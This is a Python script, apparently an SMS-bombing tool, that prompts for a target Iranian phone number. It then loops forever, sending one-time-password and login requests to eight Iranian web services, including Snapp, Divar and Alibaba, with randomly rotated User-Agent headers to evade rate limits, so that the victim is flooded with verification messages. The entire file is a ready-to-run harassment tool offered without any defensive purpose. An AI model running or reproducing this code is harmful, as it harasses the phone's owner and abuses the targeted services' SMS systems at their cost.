
def req_E(SEnd):
    import os
    import requests
    import random

    green="\033[32m"
    yellow="\033[93m"
    
    os.system('cls')
    print(F'{yellow}')
    number = input("Target phone number +98 :")

    
        
    url_snapp = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    json_snapp = {"cellphone":"+98"+number}
    
    url_divar = "https://api.divar.ir/v5/auth/authenticate"
    json_divar = {"phone":number}

    url_alibaba = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
    json_alibaba ={"phoneNumber": number}    

    url_tagche = "https://gw.taaghche.com/v4/site/auth/login"
    json_tagche = {"contact":number,"forceOtp":"true"}

    url_pezeshket = "https://api.pezeshket.com/core/v1/auth/requestCode"
    json_pezeshket = {"mobileNumber":number}

    url_namava = "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request"
    json_namava = {"UserName":"+98"+number}

    url_Mary_sms = "https://api.behtarino.com/api/v1/businesses/mqdbicdbmb/vitrin_verification/"
    json_Mary_sms = {"phone":"0"+number,"resend":"true"}

    url_golastan = "https://www.golsetan.com/wp-json/panel/v1/auth/sendMobileAuth"
    json_golastan = {"phoneNumber":"0"+number}


    heads2 = [
    {
        'User-Agent':'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
        'Accept' : '*/*'
    },
    {
        'User-Agent':'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/105.0',
        'Accept' : '*/*'
    },
    {
        'User-Agent' : 'Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/105.0',
        'Accept' : '*/*' 
    },
    {
        'User-Agent' : 'Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/105.0',
        'Accept' : '*/*' 
    },
    {
        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/105.0',
        'Accept' : '*/*'
    },
    {
        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/105.0',
        'Accept' : '*/*' 
    },
    { 
        'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
        'Accept' : '*/*' 
    },
    { 
        'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0',
        'Accept' : '*/*' 
    },
    { 
        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
        'Accept' : '*/*' 
    },
    { 
        'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
        'Accept' : '*/*' 
    },
    { 
        'User-Agent' : 'Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.2.15 Version/10.00',
        'Accept' : '*/*' 
    },
    { 
        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41',
        'Accept' : '*/*' 
    },
    { 
        'User-Agent' : 'Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)',
        'Accept' : '*/*' 
    },
    { 
        'User-Agent' : 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1',
        'Accept' : '*/*' 
    },
    {
        'Mozilla/5.0' : '(Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
        'Accept' : '*/*'
    },
]

    os.system("cls")
    print(F'{green}')

    while True:
        
        random_heads_ELITE1 = random.choice(heads2)


        req_ELITE1 = requests.post(url=url_alibaba,json=json_alibaba,headers=random_heads_ELITE1)
        print(req_ELITE1,"Send server 1",number,"<== ELITE")

        req_ELITE2 = requests.post(url=url_snapp,json=json_snapp,headers=random_heads_ELITE1)
        print(req_ELITE2,"Send server 2",number,"<== ELITE")

        req_ELITE3 = requests.post(url=url_divar,json=json_divar,headers=random_heads_ELITE1)
        print(req_ELITE3,"Send server 3",number,"<== ELITE")

        req_ELITE6 = requests.post(url=url_namava,json=json_namava,headers=random_heads_ELITE1)
        print(req_ELITE6,"Send server 6",number,"<== ELITE")

        req_ELITE7 = requests.post(url=url_golastan,json=json_golastan,headers=random_heads_ELITE1)
        print(req_ELITE7,"Send server 7",number,"<== ELITE")
    
        req_ELITE9 = requests.post(url=url_tagche,json=json_tagche,headers=random_heads_ELITE1)
        print(req_ELITE9,"Send server 9",number,"<== ELITE")

        req_ELITE11 = requests.post(url=url_Mary_sms,json=json_Mary_sms,headers=random_heads_ELITE1)
        print(req_ELITE11,"Send server 10",number,"<== ELITE")
   
        req_ELITE11 = requests.post(url=url_pezeshket,json=json_pezeshket,headers=random_heads_ELITE1)
        print(req_ELITE11,"Send server 11",number,"<== ELITE")
        
        